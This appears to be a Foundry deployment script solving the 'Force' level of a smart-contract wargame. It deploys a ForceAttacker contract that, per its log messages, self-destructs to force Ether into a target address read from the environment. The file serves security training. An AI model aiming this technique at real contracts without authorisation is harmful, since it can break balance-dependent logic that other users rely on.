// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../../src/levels/07_Force/Force.sol";

contract DeployForceAttacker is Script {
    function run() external {
        address payable forceTarget = payable(vm.envAddress("FORCE_TARGET"));
        uint256 deployValue = vm.envUint("FORCE_VALUE");

        console.log("Deploying ForceAttacker to target:", forceTarget);
        console.log("Sending value:", deployValue);

        vm.startBroadcast();
        ForceAttacker attacker = new ForceAttacker{value: deployValue}(forceTarget);
        vm.stopBroadcast();

        console.log("ForceAttacker deployed and self-destructed, Ether forced!");
        console.log("Target balance should now be increased");
    }
}
